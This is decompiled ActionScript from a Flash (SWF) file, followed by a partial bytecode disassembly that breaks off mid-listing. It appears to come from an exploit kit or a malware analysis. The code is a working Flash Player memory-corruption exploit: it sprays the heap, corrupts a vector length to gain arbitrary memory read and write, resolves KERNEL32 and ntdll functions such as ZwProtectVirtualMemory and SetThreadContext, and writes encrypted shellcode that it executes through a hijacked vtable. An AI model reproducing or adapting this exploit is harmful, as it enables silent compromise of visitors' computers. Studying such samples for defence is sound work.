            this.m_iver = stage.loaderInfo.parameters["y"];
            this.tf = new TextField();
            this.snd = new Sound();
            this.s = new Vector.<Object>(this.m_suf);
            this.ss = new Vector.<Object>(12);
            this.work = new Timer(this.delay, this.repeat);
            var _local1:* = 0;
            var _local2:* = 0;
            var _local3:* = 0;
            var _local4:* = "";
            var _local5:* = "";
            var _local6:* = ((0x1000 / 4) - 2);
            var _local7:* = 0;
            var _local8:* = ((0x1000 / 4) - 17);
            var _local9:* = (0x18182000 + 8);
            var _local10:* = 0;
            var _local11:uint;
            var _local12:uint = 0x41414141;
            _local1 = 0;
            this.m_rawLen = _local6;
            this.m_mySo = SharedObject.getLocal("mySo32");
            var _local13:Boolean = this.DetmineCookie();
            while (_local1 < this.m_suf) {
                this.s[_local1] = new Vector.<uint>(_local6);
                if (this.m_iver == "8"){
                    return;
                };
                if (this.m_iver == "9"){
                    this.s[_local1][0] = 0;
                    this.setArrValue(_local1, 6, ((_local9 + 16) - 120));
                    this.setArrValue(_local1, (6 + 4), ((_local9 + 80) - 28));
                    _local10 = 16;
                    this.setArrValue(_local1, _local10, ((_local9 + 32) - 44));
                    this.setArrValue(_local1, (_local10 + 12), ((_local9 + 32) - 44));
                    _local10 = 32;
                    this.setArrValue(_local1, _local10, (_local9 + 52));
                    this.setArrValue(_local1, (_local10 + 4), 0x42424242);
                    this.setArrValue(_local1, (_local10 + 16), 0);
                    _local10 = 52;
                    this.setArrValue(_local1, _local10, 0x42424242);
                    this.setArrValue(_local1, (_local10 + 8), 0x42424242);
                    _local10 = 80;
                    this.setArrValue(_local1, _local10, (((_local9 + 80) + 4) - 4));
                    this.setArrValue(_local1, (_local10 + 4), (((_local9 + 80) + 8) - 168));
                    this.setArrValue(_local1, (_local10 + 8), 0);
                    _local10 = 0x0100;
                    this.s[_local1][((_local10 + 4) / 4)] = (((_local9 + 8) + _local10) + 376);
                    this.s[_local1][((_local10 + 8) / 4)] = 0;
                    this.s[_local1][((_local10 + 12) / 4)] = ((((_local10 + _local9) + 12) + 12) + 4);
                    this.s[_local1][(((_local10 + 12) + 12) / 4)] = 1;
                    _local10 = (((_local10 + 12) + 12) + 4);
                    this.s[_local1][((_local10 + 28) / 4)] = ((_local9 + 4088) - 66);
                    this.s[_local1][((_local10 + 36) / 4)] = 0xFFFF0000;
                    this.s[_local1][((_local10 + 48) / 4)] = 0x41414141;
                    this.s[_local1][((_local10 + 112) / 4)] = 0x46464646;
                    _local10 = (4088 - 66);
                    this.setArrValue(_local1, (_local10 - 12), 1094795761);
                    this.setArrValue(_local1, (_local10 + 0), (((_local9 + _local10) + 8) - 32));
                    this.setArrValue(_local1, (_local10 + 8), 0xFFFFFFFF);
                    this.setArrValue(_local1, (_local10 + 12), 15);
                    this.setArrValue(_local1, (_local10 + 32), 0);
                    this.setArrValue(_local1, ((_local10 + 36) + 20), 0);
                    this.setArrValue(_local1, (_local10 + 60), 0xFFFFFFFF);
                    this.s[_local1][(1022 - 1)] = 0xFFFFFFFF;
                } else {
                    if (this.m_iver == "10"){
                        this.setArrValue(_local1, 48, (((_local9 + 4088) - 1300) - 344));
                        this.setArrValue(_local1, (148 - 8), 65536);
                        this.setArrValue(_local1, (228 - 8), 0xFFFFFFFF);
                        this.setArrValue(_local1, (52 + 448), 0);
                        _local11 = 0x0200;
                        this.setArrValue(_local1, _local11, (_local9 + _local11));
                        this.setArrValue(_local1, (_local11 + 12), 1);
                        this.setArrValue(_local1, (_local11 + 28), ((_local9 + _local11) + 0x0100));
                        this.setArrValue(_local1, (_local11 + 36), 131072);
                        this.setArrValue(_local1, (_local11 + 48), 0);
                        this.setArrValue(_local1, (_local11 + 152), (((_local9 + 4088) - 1300) - 344));
                        _local11 = (_local11 + 0x0100);
                        this.setArrValue(_local1, (_local11 + 8), 131072);
                        this.setArrValue(_local1, (_local11 + 12), _local12);
                        this.setArrValue(_local1, (_local11 + 36), 64);
                        this.setArrValue(_local1, (_local11 + 56), ((_local9 + _local11) + 12));
                        this.setArrValue(_local1, (_local11 + 68), 0xFFFFFFFF);
                        this.setArrValue(_local1, (_local11 + 92), _local12);
                        this.setArrValue(_local1, (52 + 3728), 0);
                        _local11 = 4088;
                    } else {
                        if (this.m_iver == "11"){
                            this.setArrValue(_local1, 48, (((_local9 + 4088) - 1592) - 584));
                            this.setArrValue(_local1, (312 - 8), 65536);
                            this.setArrValue(_local1, (428 - 8), 0xFFFFFFFF);
                            this.setArrValue(_local1, ((428 + 12) - 8), 0xFFFFFFFF);
                            _local11 = 0x0200;
                            this.setArrValue(_local1, _local11, (_local9 + _local11));
                            this.setArrValue(_local1, (_local11 + 12), 1);
                            this.setArrValue(_local1, (_local11 + 28), ((_local9 + _local11) + 0x0100));
                            this.setArrValue(_local1, (_local11 + 36), 0);
                            _local11 = (_local11 + 0x0100);
                            this.setArrValue(_local1, (_local11 + 8), 131072);
                            this.setArrValue(_local1, (_local11 + 68), 0xFFFFFFFF);
                            this.setArrValue(_local1, (_local11 + 92), _local12);
                            _local11 = 4088;
                        };
                    };
                };
                _local1++;
            };
            _local1 = 0;
            while (_local1 < 0x0400) {
                this.ss[_local1] = new Vector.<Object>(_local8);
                _local2 = 0;
                while (_local2 < _local8) {
                    this.ss[_local1][_local2] = this.snd;
                    _local2++;
                };
                _local1++;
            };
            if (ExternalInterface.available){
                ExternalInterface.call("eim", this.decode(this.m_trg).toString());
            };
            this.work.start();
            this.work.addEventListener(TimerEvent.TIMER, this.proc);
        }
        private function ShareObjEx():Boolean{
            var _local1:* = new Date().getTime();
            this.m_mySo.data.Cookie = this.m_Ostring;
            this.m_mySo.data.newDate = _local1;
            this.m_mySo.flush();
            return (true);
        }
        private function DetmineCookie():Boolean{
            if (((this.m_mySo.data.hasOwnProperty("Cookie")) && (this.m_mySo.data.hasOwnProperty("newDate")))){
                if (this.m_mySo.data.Cookie == this.m_Ostring){
                    return (true);
                };
            };
            return (false);
        }
        public function setArrValue(_arg1:uint, _arg2:uint, _arg3:uint):void{
            if ((_arg2 & 2)){
                this.s[_arg1][((_arg2 - 2) / 4)] = (((_arg3 & 0xFFFF) << 16) | (this.s[_arg1][((_arg2 - 2) / 4)] & 0xFFFF));
                this.s[_arg1][((_arg2 + 2) / 4)] = ((this.s[_arg1][((_arg2 + 2) / 4)] & 0xFFFF0000) | ((_arg3 & 0xFFFF0000) >> 16));
            } else {
                this.s[_arg1][(_arg2 / 4)] = _arg3;
            };
        }
        public function free(){
            var _local1:uint;
            while (_local1 < this.m_suf) {
                this.s[_local1] = null;
                _local1++;
            };
            this.s = null;
            _local1 = 0;
            while (_local1 < this.ss.length) {
                this.ss[_local1] = null;
                _local1++;
            };
            this.ss = null;
            ExternalInterface.call("fl", null);
        }
        private function hexToIntArray(_arg1:String):Vector.<int>{
            var _local2:* = null;
            var _local3:* = _arg1.length;
            var _local4:* = 0;
            var _local5:Vector.<int> = new Vector.<int>((_local3 / 2));
            var _local6:* = 0;
            while (_local4 < _local3) {
                _local2 = (_arg1.charAt(_local4) + _arg1.charAt((_local4 + 1)));
                _local5[_local6] = parseInt(_local2, 16);
                _local4 = (_local4 + 2);
                _local6 = (_local6 + 1);
            };
            return (_local5);
        }
        private function decode(_arg1:String):ByteArray{
            var _local6:int;
            var _local8:int;
            var _local9:*;
            var _local13:int;
            var _local2:Vector.<int> = new Vector.<int>(256);
            var _local3:Vector.<int> = new Vector.<int>(256);
            var _local4:Vector.<int> = this.hexToIntArray(this.m_keys);
            var _local5:int = _local4.length;
            _local6 = 0;
            while (_local6 < 0x0100) {
                _local2[_local6] = _local6;
                _local3[_local6] = _local4[(_local6 % _local5)];
                _local6++;
            };
            var _local7:int;
            _local9 = 0;
            while (_local9 < 0x0100) {
                _local7 = (((_local7 + _local2[_local9]) + _local3[_local9]) & 0xFF);
                _local8 = _local2[_local9];
                _local2[_local9] = _local2[_local7];
                _local2[_local7] = _local8;
                _local9++;
            };
            var _local10:ByteArray = new ByteArray();
            _local10.endian = Endian.LITTLE_ENDIAN;
            var _local11:Vector.<int> = this.hexToIntArray(_arg1);
            _local6 = 0;
            var _local12:int;
            _local9 = 0;
            while (_local9 < _local11.length) {
                _local6 = ((_local6 + 1) & 0xFF);
                _local12 = ((_local12 + _local2[_local6]) & 0xFF);
                _local8 = _local2[_local6];
                _local2[_local6] = _local2[_local12];
                _local2[_local12] = _local8;
                _local13 = ((_local2[_local6] + _local2[_local12]) & 0xFF);
                _local8 = _local2[_local13];
                _local10.writeByte((_local11[_local9] ^ _local8));
                _local9++;
            };
            return (_local10);
        }
        public function outInfo(_arg1:String):void{
        }
        private function read32(_arg1:uint):uint{
            if ((_arg1 % 4)){
                return (0);
            };
            if (_arg1 >= this.m_longArrBase){
                return (this.s[this.m_longArrIdx][((_arg1 - this.m_longArrBase) / 4)]);
            };
            return (this.s[this.m_longArrIdx][(0x40000000 - ((this.m_longArrBase - _arg1) / 4))]);
        }
        private function write32(_arg1:uint, _arg2:uint):void{
            if ((_arg1 % 4)){
                return;
            };
            if (_arg1 >= this.m_longArrBase){
                this.s[this.m_longArrIdx][((_arg1 - this.m_longArrBase) / 4)] = _arg2;
            } else {
                this.s[this.m_longArrIdx][(0x40000000 - ((this.m_longArrBase - _arg1) / 4))] = _arg2;
            };
        }
        private function read8(_arg1:uint):uint{
            var _local2:uint = this.read32((_arg1 & 0xFFFFFFFC));
            switch ((_arg1 % 4)){
                case 0:
                    return ((_local2 & 0xFF));
                case 1:
                    return (((_local2 >> 8) & 0xFF));
                case 2:
                    return (((_local2 >> 16) & 0xFF));
                case 3:
                    return (((_local2 >> 24) & 0xFF));
            };
            return (0);
        }
        private function read16(_arg1:uint):uint{
            if ((_arg1 % 2)){
                return (0);
            };
            var _local2:uint = this.read32((_arg1 & 0xFFFFFFFC));
            switch ((_arg1 % 4)){
                case 0:
                    return ((_local2 & 0xFFFF));
                case 1:
                    return (((_local2 >> 8) & 0xFFFF));
                case 2:
                    return (((_local2 >> 16) & 0xFFFF));
                case 3:
                    break;
            };
            return (0);
        }
        private function write8(_arg1:uint, _arg2:uint):void{
            var _local4:uint;
            var _local3:uint = this.read32((_arg1 & 0xFFFFFFFC));
            switch ((_arg1 % 4)){
                case 0:
                    _local4 = ((_local3 & 0xFFFFFF00) | (_arg2 & 0xFF));
                    break;
                case 1:
                    _local4 = ((_local3 & 0xFFFF00FF) | ((_arg2 & 0xFF) << 8));
                    break;
                case 2:
                    _local4 = ((_local3 & 0xFF00FFFF) | ((_arg2 & 0xFF) << 16));
                    break;
                case 3:
                    _local4 = ((_local3 & 0xFFFFFF) | ((_arg2 & 0xFF) << 24));
                    break;
            };
            this.write32((_arg1 & 0xFFFFFFFC), _local4);
        }
        private function writeBytes(_arg1:uint, _arg2:ByteArray):void{
            var _local4:uint;
            var _local3:* = 0;
            while ((_local3 + 3) < _arg2.length) {
                _local4 = ((((_arg2[_local3] & 0xFF) | ((_arg2[(_local3 + 1)] & 0xFF) << 8)) | ((_arg2[(_local3 + 2)] & 0xFF) << 16)) | ((_arg2[(_local3 + 3)] & 0xFF) << 24));
                this.write32((_arg1 + _local3), _local4);
                _local3 = (_local3 + 4);
            };
            while (_local3 < _arg2.length) {
                this.write8((_arg1 + _local3), _arg2[_local3]);
                _local3++;
            };
        }
        private function writeUnicodeString(_arg1:uint, _arg2:String):void{
            var _local3:ByteArray = new ByteArray();
            _local3.endian = Endian.LITTLE_ENDIAN;
            var _local4:int;
            while (_local4 < _arg2.length) {
                _local3.writeShort(_arg2.charCodeAt(_local4));
                _local4++;
            };
            _local3.writeShort(0);
            this.writeBytes(_arg1, _local3);
        }
        private function writeAsciiString(_arg1:uint, _arg2:String):void{
            var _local3:ByteArray = new ByteArray();
            _local3.endian = Endian.LITTLE_ENDIAN;
            var _local4:int;
            _local3.writeUTFBytes(_arg2);
            _local3.writeByte(0);
            this.writeBytes(_arg1, _local3);
        }
        private function asciiStrEqual(_arg1:uint, _arg2:String):Boolean{
            var _local3:ByteArray = new ByteArray();
            _local3.endian = Endian.LITTLE_ENDIAN;
            _local3.writeUTFBytes(_arg2);
            var _local4:int;
            while (_local4 < _local3.length) {
                if (this.read8((_arg1 + _local4)) != _local3[_local4]){
                    return (false);
                };
                _local4++;
            };
            return (true);
        }
        private function getModuleBase(_arg1:uint):uint{
            var _local2:* = (_arg1 & 0xFFFF0000);
            while (_local2 > 0) {
                if ((this.read32(_local2) & 0xFFFF) == 23117){
                    return (_local2);
                };
                _local2 = (_local2 - 65536);
            };
            return (0);
        }
        private function getModuleBaseFromIAT(_arg1:uint, _arg2:String, _arg3:uint):uint{
            var _local6:uint;
            var _local7:uint;
            var _local8:uint;
            var _local4:uint = (_arg1 + this.read32(((_arg1 + this.read32((_arg1 + 60))) + 128)));
            var _local5:uint = _local4;
            while (_local5 < (_local4 + 0x0100)) {
                try {
                    _local6 = (_arg1 + this.read32((_local5 + 12)));
                    if (this.asciiStrEqual(_local6, _arg2)){
                        _local7 = (_arg1 + this.read32((_local5 + 16)));
                        _local7 = ((_arg3 * 4) + _local7);
                        _local8 = this.read32(_local7);
                        while (0 == _local8) {
                            _local7 = (_local7 + 4);
                            _local8 = this.read32(_local7);
                        };
                        return (this.getModuleBase((_local8 & 0xFFFF0000)));
                    };
                } catch(e:Error) {
                };
                _local5 = (_local5 + 20);
            };
            return (0);
        }
        private function getProcAddr(_arg1:uint, _arg2:String):uint{
            var _local9:*;
            var _local10:uint;
            var _local11:uint;
            var _local3:uint = (_arg1 + this.read32(((_arg1 + this.read32((_arg1 + 60))) + 120)));
            var _local4:uint = this.read32((_local3 + 24));
            var _local5:uint = (_arg1 + this.read32((_local3 + 28)));
            var _local6:uint = (_arg1 + this.read32((_local3 + 32)));
            var _local7:uint = (_arg1 + this.read32((_local3 + 36)));
            var _local8:* = 0;
            while (_local8 < _local4) {
                _local9 = (this.read32((_local6 + (_local8 * 4))) + _arg1);
                if (this.asciiStrEqual(_local9, _arg2)){
                    _local10 = this.read16((_local7 + (_local8 * 2)));
                    _local11 = (this.read32((_local5 + (_local10 * 4))) + _arg1);
                    return (_local11);
                };
                _local8++;
            };
            return (0);
        }
        private function searchBytes(_arg1:ByteArray, _arg2:uint, _arg3:uint):uint{
            var _local5:int;
            if ((((_arg2 >= _arg3)) || (((_arg2 + _arg1.length) > _arg3)))){
                return (0);
            };
            var _local4:uint = _arg2;
            while (_local4 < _arg3) {
                _local5 = 0;
                while (_local5 < _arg1.length) {
                    if (this.read8((_local4 + _local5)) != _arg1[_local5]){
                        break;
                    };
                    _local5++;
                };
                if (_local5 == _arg1.length){
                    return (_local4);
                };
                _local4++;
            };
            return (0);
        }
        private function hexToBin(_arg1:String):ByteArray{
            var _local2:* = null;
            var _local3:* = new ByteArray();
            var _local4:* = _arg1.length;
            var _local5:* = 0;
            _local3.endian = Endian.LITTLE_ENDIAN;
            while (_local5 < _local4) {
                _local2 = (_arg1.charAt(_local5) + _arg1.charAt((_local5 + 1)));
                _local3.writeByte(parseInt(_local2, 16));
                _local5 = (_local5 + 2);
            };
            return (_local3);
        }
        private function proc(_arg1:TimerEvent):void{
            var _local2:uint;
            var _local3:uint;
            var _local4:uint;
            var _local5:uint;
            var _local6:uint;
            var _local7:uint;
            var _local8:uint;
            var _local9:uint;
            var _local10:uint;
            var _local11:uint;
            var _local12:uint;
            var _local13:uint;
            var _local14:uint;
            var _local15:uint;
            var _local16:uint;
            var _local17:uint;
            var _local18:uint;
            var _local19:uint;
            var _local20:String;
            var _local21:uint;
            var _local22:uint;
            var _local23:uint;
            var _local25:int;
            var _local26:int;
            var _local27:int;
            var _local28:int;
            var _local30:uint;
            var _local31:uint;
            var _local32:uint;
            var _local33:uint;
            var _local37:int;
            var _local38:ByteArray;
            var _local39:uint;
            var _local40:uint;
            var _local41:*;
            var _local42:uint;
            var _local43:*;
            var _local24:* = _arg1;
            var _local29:int;
            var _local34:* = 0x18183000;
            var _local35:* = 4064;
            var _local36:* = 65536;
            _local12 = 404238344;
            if (((this.found) && ((this.m_status == 0xFFFF)))){
                this.work.stop();
                return;
            };
            if (this.m_status == 0){
                _local25 = 0;
                while (_local25 < this.m_suf) {
                    try {
                        if ((this.s[_local25] as Vector.<uint>).length > this.m_rawLen){
                            break;
                        };
                    } catch(e:Error) {
                    };
                    _local25 = (_local25 + 1);
                };
                if (_local25 == this.m_suf){
                    return;
                };
                _local26 = 1;
                _local28 = -1;
                this.s[_local25][(((0x1000 * _local26) / 4) - 2)] = 1073741808;
                _local37 = 0;
                while (_local37 < this.s.length) {
                    if (this.s[_local37].length == 1073741808){
                        _local28 = _local37;
                        _local12 = (_local12 + 0x1000);
                        break;
                    };
                    _local37++;
                };
                if (_local28 == -1){
                    return;
                };
                this.m_longArrBase = _local12;
                this.m_longArrIdx = _local28;
                this.write32(_local34, this.m_rawLen);
                this.m_status++;
            };
            if (this.m_status == 1){
                _local9 = ((this.m_longArrBase + 4088) + 0x1000);
                _local25 = 0;
                while (_local25 < _local36) {
                    try {
                        if ((((((((_local9 + (_local25 * 0x1000)) % 65536) == 0)) && (!((this.read32((_local9 + (_local25 * 0x1000))) == this.m_rawLen))))) && (!((this.read32(((_local9 + (_local25 * 0x1000)) + 4)) == _local35))))){
                            _local9 = (_local9 + 65536);
                            if (_local25 != 0){
                                _local25--;
                            };
                        } else {
                            if ((((((this.read32(((_local9 + (_local25 * 0x1000)) + 4)) == _local35)) && ((this.read32(((_local9 + (_local25 * 0x1000)) + (4 * 17))) > 0)))) && ((this.read32(((_local9 + (_local25 * 0x1000)) + (4 * 17))) == this.read32(((_local9 + (_local25 * 0x1000)) + (4 * 100))))))){
                                _local9 = this.read32(((_local9 + (_local25 * 0x1000)) + (4 * 17)));
                                break;
                            };
                        };
                    } catch(e:Error) {
                    };
                    _local25 = (_local25 + 1);
                };
                if (_local25 == _local36){
                    return;
                };
                _local9 = (_local9 & 0xFFFFFFFC);
                _local16 = _local9;
                this.m_flashVirtual = _local16;
                _local17 = this.getModuleBase((this.read32(_local9) & 0xFFFF0000));
                if (_local17 == 0){
                    ExternalInterface.call("errorRepro", "can't search the module base!");
                    return;
                };
                this.m_flashBase = _local17;
                this.m_status++;
            };
            if (this.m_status == 2){
                _local4 = this.getModuleBaseFromIAT(this.m_flashBase, "KERNEL32", 0);
                if (_local4 == 0){
                    return;
                };
                this.m_kernel32Base = _local4;
                this.m_status++;
            };
            if (this.m_status == 3){
                _local3 = this.getModuleBaseFromIAT(this.m_kernel32Base, "ntdll", 0);
                if (_local3 == 0){
                    return;
                };
                this.m_ntdllBase = _local3;
                this.m_status++;
            };
            if (this.m_status == 4){
                _local10 = this.getProcAddr(this.m_ntdllBase, "ZwProtectVirtualMemory");
                if (_local10 == 0){
                    return;
                };
                this.m_ZwProtectAddr = _local10;
                this.m_status++;
            };
            if (this.m_status == 5){
                _local13 = this.read32((this.m_ntdllBase + 60));
                _local14 = this.read32(((this.m_ntdllBase + _local13) + 264));
                _local13 = this.read32(((this.m_ntdllBase + _local13) + 260));
                _local13 = (this.m_ntdllBase + _local13);
                _local14 = (this.m_ntdllBase + _local14);
                _local38 = new ByteArray();
                _local38.endian = Endian.LITTLE_ENDIAN;
                _local38.writeShort(50068);
                _local15 = this.searchBytes(_local38, _local13, _local14);
                if (_local15 == 0){
                    return;
                };
                this.m_xchgInstAddr = _local15;
                this.m_status++;
            };
            if (this.m_status == 6){
                this.m_SetThreadContext = this.getProcAddr(this.m_kernel32Base, "SetThreadContext");
                if (this.m_SetThreadContext == 0){
                    _local40 = 0;
                    _local39 = this.m_kernel32Base;
                    _local40 = 0;
                    while (_local40 < 100) {
                        this.m_kernel32Base = this.getModuleBaseFromIAT(_local39, "KERNEL32", _local40);
                        if (this.m_kernel32Base == 0){
                        } else {
                            this.m_SetThreadContext = this.getProcAddr(this.m_kernel32Base, "SetThreadContext");
                            if (this.m_SetThreadContext != 0){
                                break;
                            };
                        };
                        _local40++;
                    };
                    if (this.m_SetThreadContext == 0){
                        return;
                    };
                };
                this.m_status++;
            };
            if (this.m_status == 7){
                _local9 = this.m_flashVirtual;
                _local7 = this.read32(_local9);
                _local6 = (this.m_longArrBase + 248);
                _local12 = this.m_longArrBase;
                _local10 = this.m_ZwProtectAddr;
                _local41 = _local6;
                this.s[_local28][((((_local6 - _local12) / 4) - 2) - 4)] = (_local41 & 0xFFFFF000);
                this.s[_local28][((((_local6 - _local12) / 4) - 1) - 4)] = 0x3000;
                this.s[_local28][((_local6 - _local12) / 4)] = _local10;
                this.s[_local28][(((_local6 - _local12) / 4) + 1)] = (_local41 + 28);
                this.s[_local28][(((_local6 - _local12) / 4) + 2)] = 0xFFFFFFFF;
                this.s[_local28][(((_local6 - _local12) / 4) + 3)] = (_local6 - 24);
                this.s[_local28][(((_local6 - _local12) / 4) + 4)] = (_local6 - 20);
                this.s[_local28][(((_local6 - _local12) / 4) + 5)] = 64;
                this.s[_local28][(((_local6 - _local12) / 4) + 6)] = (_local6 - 28);
                this.s[_local28][(((_local41 - _local12) / 4) + 7)] = 0x18002D89;
                this.s[_local28][(((_local41 - _local12) / 4) + 8)] = 3096451096;
                this.s[_local28][(((_local41 - _local12) / 4) + 9)] = _local9;
                this.s[_local28][(((_local41 - _local12) / 4) + 10)] = 13078672;
                this.s[_local28][(((_local41 - _local12) / 4) + 11)] = _local7;
                this.s[_local28][(((_local41 - _local12) / 4) + 12)] = 3096481936;
                this.s[_local28][(((_local41 - _local12) / 4) + 13)] = (this.m_longArrBase - 8);
                this.s[_local28][(((_local41 - _local12) / 4) + 14)] = 13078672;
                this.s[_local28][(((_local41 - _local12) / 4) + 15)] = this.m_rawLen;
                this.s[_local28][(((_local41 - _local12) / 4) + 16)] = 3968066955;
                this.s[_local28][(((_local41 - _local12) / 4) + 17)] = 753635372;
                this.s[_local28][(((_local41 - _local12) / 4) + 17)] = 753635372;
                this.s[_local28][(((_local6 - _local12) / 4) + 28)] = this.m_xchgInstAddr;
                _local42 = 29;
                _local43 = new ByteArray();
                _local43.endian = Endian.LITTLE_ENDIAN;
                _local43.writeBytes(this.decode("630ed5495eaad7cd8b52d42b60f0757f103583276a31f7cbee2201fd80f167"));
                _local43.writeInt(this.m_SetThreadContext);
                _local43.writeBytes(this.decode("cb5fb86dbbafd70ad04504"));
                _local43.writeBytes(this.decode(this.m_dump7));
                this.writeBytes((_local41 + (_local42 * 4)), _local43);
                this.write32(_local9, _local6);
                this.snd.toString();
                this.m_status = 0xFFFF;
                this.free();
            };
        }

    }
}//package

// -----------------------
// Disassembly
// -----------------------

abc name frame1
magic 2e0010
Cpool numbers size 171 1 %
Cpool strings count 138 size 4732 41 %
Cpool namespaces count 21 size 41 0 %
Cpool nssets count 2 size 22 0 %
Cpool names count 110 size 334 2 %
MethodInfo count 25 size 133 1 %
InstanceInfo count 1 size 257 2 %
ClassInfo count 1 size 2 0%
ScriptInfo size 7 0 %
MethodBodies count 25 size 5781 50 %


   //    script0

   class Tope extends flash.display::Sprite
   {

     function Tope():void	/* disp_id=-1 method_id=5 nameIndex = 10 */
     {
       // local_count=14 max_scope=1 max_stack=5 code_len=1327
       // method position=5328 code position=6030
       0    getlocal0     	
       1    pushscope     	
       2    getlocal0     	
       3    constructsuper	(0)
       5    getlocal0     	
       6    getlex        	stage //nameIndex = 79
       8    getproperty   	loaderInfo //nameIndex = 80
       10   getproperty   	parameters //nameIndex = 81
       12   pushstring    	"y"
       14   getproperty   	null //nameIndex = 75
       16   initproperty  	m_iver //nameIndex = 39
       18   getlocal0     	
       19   findpropstrict	flash.text::TextField //nameIndex = 25
       21   constructprop 	flash.text::TextField (0) //nameIndex = 25
       24   initproperty  	tf //nameIndex = 24
       26   getlocal0     	
       27   findpropstrict	flash.media::Sound //nameIndex = 17
       29   constructprop 	flash.media::Sound (0) //nameIndex = 17
       32   initproperty  	private::snd //nameIndex = 16
       34   getlocal0     	
       35   getlex        	Vector //nameIndex = 82
       37   getlex        	Object //nameIndex = 13
       39   applytype     	(1)
       41   getlocal0     	
       42   getproperty   	m_suf //nameIndex = 45
       44   construct     	(1)
       46   initproperty  	s //nameIndex = 23
       48   getlocal0     	
       49   getlex        	Vector //nameIndex = 82
       51   getlex        	Object //nameIndex = 13
       53   applytype     	(1)
       55   pushbyte      	12
       57   construct     	(1)
       59   initproperty  	ss //nameIndex = 12
       61   getlocal0     	
       62   findpropstrict	flash.utils::Timer //nameIndex = 22
       64   getlocal0     	
       65   getproperty   	private::delay //nameIndex = 15
       67   getlocal0     	
       68   getproperty   	private::repeat //nameIndex = 28
       70   constructprop 	flash.utils::Timer (2) //nameIndex = 22
       73   initproperty  	private::work //nameIndex = 21
       75   pushbyte      	0
       77   coerce_a      	
       78   setlocal1     	
       79   pushbyte      	0
       81   coerce_a      	
       82   setlocal2     	
       83   pushbyte      	0
       85   coerce_a      	
       86   setlocal3     	
       87   pushstring    	""
       89   coerce_a      	
       90   setlocal      	4
       92   pushstring    	""
       94   coerce_a      	
       95   setlocal      	5
       97   pushshort     	4096
       100  pushbyte      	4
       102  divide        	
       103  pushbyte      	2
       105  subtract      	
       106  coerce_a      	
       107  setlocal      	6
       109  pushbyte      	0
       111  coerce_a      	
       112  setlocal      	7
       114  pushshort     	4096
       117  pushbyte      	4
       119  divide        	
       120  pushbyte      	17
       122  subtract      	
       123  coerce_a      	
       124  setlocal      	8
       126  pushint       	404234240	// 0x18182000
       128  pushbyte      	8
       130  add           	
       131  coerce_a      	
       132  setlocal      	9
       134  pushbyte      	0
       136  coerce_a      	
       137  setlocal      	10
       139  pushbyte      	0
       141  convert_u     	
       142  setlocal      	11
       144  pushint       	1094795585	// 0x41414141
       146  convert_u     	
       147  setlocal      	12
       149  pushbyte      	0
       151  coerce_a      	
       152  setlocal1     	
       153  getlocal0     	
       154  getlocal      	6
       156  initproperty  	m_rawLen //nameIndex = 44
       158  getlocal0     	
       159  getlex        	flash.net::SharedObject //nameIndex = 42
       161  pushstring    	"mySo32"
       163  callproperty  	getLocal (1) //nameIndex = 83
       166  initproperty  	m_mySo //nameIndex = 41
       168  getlocal0     	
       169  callproperty  	private::DetmineCookie (0) //nameIndex = 47
       172  convert_b     	
       173  setlocal      	13
       175  jump          	L1

       
       L2: 
       179  label         	
       180  getlocal0     	
       181  getproperty   	s //nameIndex = 23
       183  getlocal1     	
       184  getlex        	Vector //nameIndex = 82
       186  getlex        	uint //nameIndex = 3
       188  applytype     	(1)
       190  getlocal      	6
       192  construct     	(1)
       194  setproperty   	null //nameIndex = 75
       196  getlocal0     	
       197  getproperty   	m_iver //nameIndex = 39
       199  pushstring    	"8"
       201  ifne          	L3

       205  returnvoid    	
       
       L3: 
       206  getlocal0     	
       207  getproperty   	m_iver //nameIndex = 39
       209  pushstring    	"9"
       211  ifne          	L4

       215  getlocal0     	
       216  getproperty   	s //nameIndex = 23
       218  getlocal1     	
       219  getproperty   	null //nameIndex = 75
       221  pushbyte      	0
       223  dup           	
       224  setproperty   	null //nameIndex = 75
       226  getlocal0     	
       227  getlocal1     	
       228  pushbyte      	6
       230  getlocal      	9
       232  pushbyte      	16
       234  add           	
       235  pushbyte      	120
       237  subtract      	
       238  callpropvoid  	setArrValue (3) //nameIndex = 48
       241  getlocal0     	
       242  getlocal1     	
       243  pushbyte      	6
       245  pushbyte      	4
       247  add           	
       248  getlocal      	9
       250  pushbyte      	80
       252  add           	
       253  pushbyte      	28
       255  subtract      	
       256  callpropvoid  	setArrValue (3) //nameIndex = 48
       259  pushbyte      	16
       261  coerce_a      	
       262  setlocal      	10
       264  getlocal0     	
       265  getlocal1     	
       266  getlocal      	10
       268  getlocal      	9
       270  pushbyte      	32
       272  add           	
       273  pushbyte      	44
       275  subtract      	
       276  callpropvoid  	setArrValue (3) //nameIndex = 48
       279  getlocal0     	
       280  getlocal1     	
       281  getlocal      	10
       283  pushbyte      	12
       285  add           	
       286  getlocal      	9
       288  pushbyte      	32
       290  add           	
       291  pushbyte      	44
       293  subtract      	
       294  callpropvoid  	setArrValue (3) //nameIndex = 48
       297  pushbyte      	32
       299  coerce_a      	
       300  setlocal      	10
       302  getlocal0     	
       303  getlocal1     	
       304  getlocal      	10
       306  getlocal      	9
       308  pushbyte      	52
       310  add           	
       311  callpropvoid  	setArrValue (3) //nameIndex = 48
       314  getlocal0     	
       315  getlocal1     	
       316  getlocal      	10
       318  pushbyte      	4
       320  add           	
       321  pushint       	1111638594	// 0x42424242
       323  callpropvoid  	setArrValue (3) //nameIndex = 48
       326  getlocal0     	
       327  getlocal1     	
       328  getlocal      	10
       330  pushbyte      	16
       332  add           	
       333  pushbyte      	0
       335  callpropvoid  	setArrValue (3) //nameIndex = 48
       338  pushbyte      	52
       340  coerce_a      	
       341  setlocal      	10
       343  getlocal0     	
       344  getlocal1     	
       345  getlocal      	10
       347  pushint       	1111638594	// 0x42424242
       349  callpropvoid  	setArrValue (3) //nameIndex = 48
       352  getlocal0     	
       353  getlocal1     	
       354  getlocal      	10
       356  pushbyte      	8
       358  add           	
       359  pushint       	1111638594	// 0x42424242
       361  callpropvoid  	setArrValue (3) //nameIndex = 48
       364  pushbyte      	80
       366  coerce_a      	
       367  setlocal      	10
       369  getlocal0     	
       370  getlocal1     	
       371  getlocal      	10
       373  getlocal      	9
       375  pushbyte      	80
       377  add           	
       378  pushbyte      	4
       380  add           	
       381  pushbyte      	4
       383  subtract      	
       384  callpropvoid  	setArrValue (3) //nameIndex = 48
       387  getlocal0     	
       388  getlocal1     	
       389  getlocal      	10
       391  pushbyte      	4
       393  add           	
       394  getlocal      	9
       396  pushbyte      	80
       398  add           	
       399  pushbyte      	8
       401  add           	
       402  pushshort     	168
       405  subtract      	
       406  callpropvoid  	setArrValue (3) //nameIndex = 48
       409  getlocal0     	
       410  getlocal1     	
